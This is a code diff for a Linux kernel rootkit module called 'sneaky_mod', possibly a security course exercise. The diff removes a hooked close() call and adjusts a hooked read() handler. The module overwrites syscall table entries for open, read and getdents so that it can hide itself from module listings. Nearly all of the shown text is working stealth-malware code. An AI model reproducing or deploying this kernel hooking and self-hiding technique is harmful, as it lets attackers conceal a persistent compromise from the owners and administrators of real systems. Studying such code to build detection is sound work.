@@ -56,7 +56,7 @@ static unsigned long *sys_call_table = (unsigned long *)0xffffffff81a00200;
 // should expect ti find its arguments on the stack (not in registers).
 // This is used for all system calls.
 asmlinkage int (*original_call)(const char *pathname, int flags);
-asmlinkage int (*original_close)(int fd);
+
 asmlinkage long (*orig_getdents)(unsigned int fd,
                                  struct linux_dirent64 __user *dirp,
                                  unsigned int count);
@@ -78,11 +78,12 @@ asmlinkage ssize_t sneaky_sys_read(int fd, char *buf, size_t count) {
   char *end;
   rest = (*orig_read)(fd, buf, count);
   if (module_pointer >= 0 && module_pointer == fd) {
+    module_pointer = -1;
     ptr = strstr(buf, "sneaky_mod");
     if (ptr != NULL) {
       end = strchr(ptr, '\n');
-      memmove(ptr, end + 1, rest - (int)(end - buf));
-      rest -= (int)(end - ptr);
+      memmove(ptr, end + 1, rest - (ssize_t)(end - buf));
+      rest -= (ssize_t)(end - ptr);
     }
   }
   return rest;
@@ -131,12 +132,6 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags) {
   return fd;
 }
 
-asmlinkage int sneaky_sys_close(int fd) {
-  if (fd == module_pointer)
-    module_pointer = -1;
-  return original_close(fd);
-}
-
 // The code that gets executed when the module is loaded
 static int initialize_sneaky_module(void) {
   struct page *page_ptr;
@@ -156,12 +151,11 @@ static int initialize_sneaky_module(void) {
   original_call = (void *)*(sys_call_table + __NR_open);
   orig_getdents = (void *)*(sys_call_table + __NR_getdents);
   orig_read = (void *)*(sys_call_table + __NR_read);
-  original_close = (void *)*(sys_call_table + __NR_close);
 
   *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
   *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
   *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
-  *(sys_call_table + __NR_close) = (unsigned long)sneaky_sys_close;
+
   // Revert page to read-only
   pages_ro(page_ptr, 1);
   // Turn write protection mode back on
@@ -189,7 +183,7 @@ static void exit_sneaky_module(void) {
   *(sys_call_table + __NR_open) = (unsigned long)original_call;
   *(sys_call_table + __NR_read) = (unsigned long)orig_read;
   *(sys_call_table + __NR_getdents) = (unsigned long)orig_getdents;
-  *(sys_call_table + __NR_close) = (unsigned long)original_close;
+
   // Revert page to read-only
   pages_ro(page_ptr, 1);
   // Turn write protection mode back on
